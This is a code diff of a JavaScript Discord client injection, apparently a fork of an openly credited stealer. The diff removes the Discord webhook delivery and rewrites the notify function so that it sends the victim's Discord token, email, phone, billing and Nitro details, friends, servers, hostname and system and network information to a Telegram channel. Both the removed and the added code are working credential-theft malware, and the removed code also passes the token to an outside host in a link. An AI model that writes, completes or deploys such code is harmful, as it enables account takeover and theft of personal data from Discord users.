@@ -32,7 +32,6 @@ const execScript = async (script) => {
 };
 
 const CONFIG = {
-    webhook: '%WEBHOOK_URL%',
     API: '%API_URL%',
     auto_user_profile_edit: '%AUTO_USER_PROFILE_EDIT%',
     auto_persist_startup: '%AUTO_PERSIST_STARTUP%',
@@ -273,103 +272,55 @@ const notify = async (ctx, token, user) => {
         getData.Badges(user.flags),
     ];
 
-    ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\`\n\n${ctx.content}`;
-    ctx.username = `AuraThemes - injection`;
-    ctx.avatar_url = `https://i.imgur.com/CeFqJOc.gif`;
-
-    ctx.embeds[0].fields.unshift({
-        name: `<a:hearts:1176516454540116090> Token:`,
-        value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
-        inline: false
-    })
-
-    ctx.embeds[0].thumbnail = {
-        url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
-    };
-
-    ctx.embeds[0].fields.push(
-        { name: "\u200b", value: "\u200b", inline: false },
-        { name: "Nitro", value: nitro, inline: true },
-        { name: "Phone", value: user.phone ? `\`${user.phone}\`` : '❓', inline: true },
-        { name: "\u200b", value: "\u200b", inline: false },
-        { name: "Badges", value: badges, inline: true },
-        { name: "Billing", value: billing, inline: true },
-        { name: "Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
-    );
-
-    if (friends) {
-        ctx.embeds.push({ title: friends.title, description: friends.description });
-    }
-
-    if (servers) {
-        ctx.embeds.push({ title: servers.title, description: servers.description });
-    }
-
-    ctx.embeds.push({
-        title: `System Information`,
-        fields: [
-            { name: "User", value: `||\`\`\`\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\`\`\`||` },
-            { name: "System", value: `||\`\`\`\n${Object.entries(system).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, },
-            { name: "Network", value: `||\`\`\`\n${Object.entries(network).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, }
-        ]
-    });
-
-    ctx.embeds.forEach(embed => {
-        embed.color = 12740607;
-        embed.author = {
-            name: `${user.username} | ${user.id}`,
-            icon_url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.round(Math.random() * 5)}.png`,
-        };
-
-        embed.footer = {
-            text: 'github.com/k4itrun/discord-injection - made by k4itrun',
-            icon_url: "https://avatars.githubusercontent.com/u/103044629",
-        };
-
-        embed.timestamp = new Date();
-    });
-
-    try {
-        // Try Discord webhook first
-        const webhookResponse = await request('POST', CONFIG.webhook, {
-            "Content-Type": "application/json"
-        }, JSON.stringify(ctx));
-
-        if (!webhookResponse) {
-            // If webhook fails, send to Telegram
-            const telegramMessage = formatMessageForTelegram(ctx, user);
-            await sendTelegramMessage(telegramMessage);
-        }
-        
-        return webhookResponse;
-    } catch (error) {
-        // If webhook fails, send to Telegram
-        const telegramMessage = formatMessageForTelegram(ctx, user);
-        await sendTelegramMessage(telegramMessage);
-        return null;
-    }
-};
-
-const formatMessageForTelegram = (ctx, user) => {
-    let message = `<b>${ctx.content}</b>\n\n`;
+    // Format message for Telegram
+    let message = `<b>${process.env.USERNAME} - ${process.env.USERDOMAIN}</b>\n\n`;
+    message += `<b>${ctx.content}</b>\n\n`;
     
     // Add token
-    message += `<b>Token:</b>\n<code>${ctx.embeds[0].fields[0].value.split('```')[1]}</code>\n\n`;
+    message += `<b>Token:</b>\n<code>${token}</code>\n\n`;
     
     // Add user info
-    message += `<b>User:</b> ${user.username} (${user.id})\n`;
-    message += `<b>Email:</b> ${user.email}\n`;
-    message += `<b>Phone:</b> ${user.phone || '❓'}\n\n`;
+    message += `<b>User Information:</b>\n`;
+    message += `Username: ${user.username}\n`;
+    message += `ID: ${user.id}\n`;
+    message += `Email: ${user.email}\n`;
+    message += `Phone: ${user.phone || '❓'}\n`;
+    message += `Nitro: ${nitro}\n`;
+    message += `Badges: ${badges}\n`;
+    message += `Billing: ${billing}\n\n`;
     
     // Add system info
     message += `<b>System Information:</b>\n`;
     message += `Username: ${process.env.USERNAME}\n`;
     message += `Hostname: ${process.env.USERDOMAIN}\n`;
+    message += `Path: <code>${__dirname.trim().replace(/\\/g, "/")}</code>\n\n`;
     
-    // Add path
-    message += `\n<b>Path:</b>\n<code>${__dirname.trim().replace(/\\/g, "/")}</code>`;
+    // Add friends if available
+    if (friends) {
+        message += `<b>${friends.title}</b>\n`;
+        message += `${friends.description}\n\n`;
+    }
     
-    return message;
+    // Add servers if available
+    if (servers) {
+        message += `<b>${servers.title}</b>\n`;
+        message += `${servers.description}\n\n`;
+    }
+    
+    // Add detailed system info
+    message += `<b>Detailed System Info:</b>\n`;
+    message += `<code>${Object.entries(system).map(([name, value]) => `${name}: ${value}`).join("\n")}</code>\n\n`;
+    
+    // Add network info
+    message += `<b>Network Information:</b>\n`;
+    message += `<code>${Object.entries(network).map(([name, value]) => `${name}: ${value}`).join("\n")}</code>`;
+
+    try {
+        await sendTelegramMessage(message);
+        return true;
+    } catch (error) {
+        return null;
+    }
 };
 
 const getBackupCodes = async (response) => {
